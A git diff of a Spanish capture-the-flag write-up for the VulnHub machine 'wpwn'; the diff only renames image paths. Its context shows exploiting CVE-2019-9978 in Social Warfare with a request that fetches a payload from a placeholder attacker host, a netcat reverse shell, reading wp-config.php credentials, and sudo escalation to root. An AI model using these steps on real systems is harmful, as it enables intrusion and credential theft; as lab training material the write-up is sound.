@@ -54,7 +54,7 @@ gobuster dir -u http://192.168.204.169 -w /usr/share/SecLists/Discovery/Web-Cont
 ```
 
 Descubriendo así un directorio existente en el servicio Web con nombre "**/wordpress**"
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116132515.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116132515.png)
 
 Es decir, qué está corriendo un **CMS** **WordPress** en el servicio web Apache del **:80**
 
@@ -62,7 +62,7 @@ Es decir, qué está corriendo un **CMS** **WordPress** en el servicio web Apach
 ____
 
 Echándole un vistazo al código fuente para ver plugins...
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116132740.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116132740.png)
 
 Vemos que como uno de sus **plugins** tiene el "**Social Warfare v3.5.2**" que sí indagamos sobre posibles vulnerabilidades, encontraremos la vulnerabilidad **CVE-2019-9978** qué podemos llevar a cabo un **RCE** sin estar autenticados en ésta versión de Social Warfare.
 
@@ -95,12 +95,12 @@ nc -nlvp 443
 website/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://IP_ATACANTE/PAYLOAD
 ```
 
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116134704.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116134704.png)
 
 
 Y recibiríamos nuestra **Reverse Shell**.
 
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116134947.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116134947.png)
 Ya tan sólo quedaría darle **tratamiento a la TTY**, que sino sabes darle tratamiento te recomiendo [((Leer este POST))](https://4uli.github.io/tratamiento-tty/)
 
 # Escalada de Privilegios #1 
@@ -108,13 +108,13 @@ _____________
 
 Indagando en los recursos **WordPress** qué desde fuera no tenemos acceso, encontraríamos el "**wp-config.php**" qué es donde está la configuración del mismo CMS, y sí le echamos un ojo encontraríamos las credenciales de la DB.
 
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135220.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116135220.png)
 
 y viendo los usuarios válidos del sistema en el **Passwd**, encontraríamos el usuario **takis**.
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135351.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116135351.png)
 
 Por ende, se me ocurre colocar ésta credencial en el usuarios takis.
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135502.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116135502.png)
 
 Logrando así entrar como **takis**, gracias a una reutilización de contraseña.
 
@@ -126,7 +126,7 @@ Sí como **takis**, listamos los permisos **SUDOERS**.
 ```bash
 sudo -l
 ```
-![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135731.png)
+![](/assets/images/vulnhub-writeup-wpwn/Pasted image 20231116135731.png)
 
 Podemos ejecutar cualquier comando como quién sea, es decir, podemos convertirnos en **root** tan fácil como:
 ```bash
